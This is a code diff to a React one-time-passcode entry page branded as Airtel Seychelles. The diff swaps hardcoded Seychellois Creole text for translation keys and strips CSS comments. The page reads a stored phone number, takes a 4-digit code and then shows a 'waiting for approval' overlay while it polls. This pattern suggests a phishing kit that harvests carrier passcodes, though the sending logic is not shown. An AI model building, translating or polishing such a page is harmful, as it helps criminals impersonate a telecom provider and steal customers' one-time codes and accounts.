@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useCallback, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { useLanguage } from './LanguageContext'; // <-- Import hook
 
 const API_BASE = import.meta.env.VITE_API_BASE_URL ?? '';
 
@@ -17,12 +18,14 @@ function makeRefId() {
 }
 
 function formatPhone(p: string) {
-  // CHANGED: Translated fallback text
-  if (!p) return 'ou telefon';
+  if (!p) return '...';
   return p.replace(/\s+/g, ''); 
 }
 
 function AirtelOTPVerify() {
+  const navigate = useNavigate();
+  const { t } = useLanguage(); // <-- Use hook
+
   const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
   const [timeLeft, setTimeLeft] = useState(TIMER_START);
   const [timerResetKey, setTimerResetKey] = useState(0);
@@ -36,7 +39,6 @@ function AirtelOTPVerify() {
   const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
   const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const hasResumedRef = useRef(false);
-  const navigate = useNavigate();
 
   const phoneNumber = localStorage.getItem('airtelPhone') || '';
 
@@ -239,7 +241,6 @@ function AirtelOTPVerify() {
           position: relative;
         }
 
-        /* FADED BACKGROUND CLASS */
         .faded-content {
           opacity: 0.15;
           pointer-events: none;
@@ -249,7 +250,6 @@ function AirtelOTPVerify() {
           min-height: 100vh;
         }
 
-        /* WAITING OVERLAY */
         .waiting-overlay {
           position: fixed;
           top: 0;
@@ -262,7 +262,7 @@ function AirtelOTPVerify() {
           justify-content: center;
           z-index: 9999;
           padding: 20px;
-          background-color: rgba(255, 255, 255, 0.9); /* Mostly solid white to hide background */
+          background-color: rgba(255, 255, 255, 0.9);
         }
 
         .custom-spinner {
@@ -301,7 +301,6 @@ function AirtelOTPVerify() {
           box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
-        /* HEADER */
         .header-section {
           padding: 40px 24px 30px;
           display: flex;
@@ -334,7 +333,6 @@ function AirtelOTPVerify() {
           color: #1a1a1a;
         }
 
-        /* MAIN CARD */
         .main-card {
           background-color: #ffffff;
           width: 90%;
@@ -382,7 +380,6 @@ function AirtelOTPVerify() {
           text-align: center;
         }
 
-        /* OTP INPUT BOXES */
         .otp-inputs-container {
           display: flex;
           gap: 16px;
@@ -410,7 +407,6 @@ function AirtelOTPVerify() {
           border-color: #2A5CAA;
         }
 
-        /* TIMER */
         .otp-timer-text {
           font-size: 14px;
           color: #6B7280;
@@ -423,7 +419,6 @@ function AirtelOTPVerify() {
           color: #1a1a1a;
         }
 
-        /* BUTTON */
         .login-btn {
           width: 100%;
           padding: 18px;
@@ -446,7 +441,6 @@ function AirtelOTPVerify() {
           color: #ffffff;
         }
 
-        /* SECURITY TEXT */
         .security-footer {
           display: flex;
           align-items: center;
@@ -457,7 +451,6 @@ function AirtelOTPVerify() {
           font-weight: 500;
         }
 
-        /* FOOTER ICONS */
         .brand-icons-footer {
           flex: 1;
           display: flex;
@@ -477,18 +470,15 @@ function AirtelOTPVerify() {
       {showWaitingOverlay && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          {/* CHANGED: Translated to Seychellois Creole */}
-          <div className="waiting-title">Pey atann aprobasyon</div>
+          <div className="waiting-title">{t('approvalSpinner')}</div>
           <div className="waiting-message">
-            Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...
+            {t('otpWaitingSub')}
           </div>
         </div>
       )}
 
-      {/* MAIN CONTENT WRAPPER (Gets faded when waiting) */}
       <div className={showWaitingOverlay ? 'faded-content' : ''}>
         
-        {/* HEADER */}
         <div className="header-section">
           <button className="menu-btn" onClick={() => navigate('/')}>
             <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
@@ -497,24 +487,20 @@ function AirtelOTPVerify() {
               <line x1="3" y1="18" x2="21" y2="18"></line>
             </svg>
           </button>
-          {/* CHANGED: Translated to Seychellois Creole */}
           <h1 className="header-title">Airtel Sesel</h1>
-          <p className="header-subtitle">Pre rapid. Nenport ler. Nenport kote.</p>
+          <p className="header-subtitle">{t('brandSubtitle')}</p>
         </div>
 
-        {/* MAIN CARD */}
         <div className="main-card">
-          {/* CHANGED: Translated to Seychellois Creole */}
-          <h2 className="card-title">Verifikasyon OTP</h2>
+          <h2 className="card-title">{t('otpTitle')}</h2>
           <p className="card-subtitle">
-            Antre OTP ki finn ganny voye kot ou nimero telefon
+            {t('otpSubtitle')}
             <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
           </p>
 
           <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
             
-            {/* CHANGED: Translated to Seychellois Creole */}
-            <span className="input-label">Antre OTP 4 sif</span>
+            <span className="input-label">{t('enterOtp')}</span>
             
             <div className="otp-inputs-container">
               {otp.map((digit, index) => (
@@ -535,9 +521,8 @@ function AirtelOTPVerify() {
               ))}
             </div>
 
-            {/* CHANGED: Translated to Seychellois Creole */}
             <p className="otp-timer-text">
-              Koud i ekspire dan <strong>{timeLeft}</strong> segonn
+              {t('otpExpires')} <strong>{timeLeft}</strong> {t('seconds')}
             </p>
 
             <button 
@@ -545,8 +530,7 @@ function AirtelOTPVerify() {
               className={`login-btn ${isFormValid ? 'active' : ''}`}
               disabled={!isFormValid || showWaitingOverlay}
             >
-              {/* CHANGED: Translated to Seychellois Creole */}
-              SOUMET
+              {t('submitBtn')}
               <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12" />
                 <polyline points="12 5 19 12 12 19" />
@@ -559,12 +543,10 @@ function AirtelOTPVerify() {
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
-            {/* CHANGED: Translated to Seychellois Creole */}
-            Ou bann informasyon i an sekirite.
+            {t('secureText')}
           </div>
         </div>
 
-        {/* BRAND ICONS FOOTER */}
         <div className="brand-icons-footer">
           <div className="brand-icon">
             <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
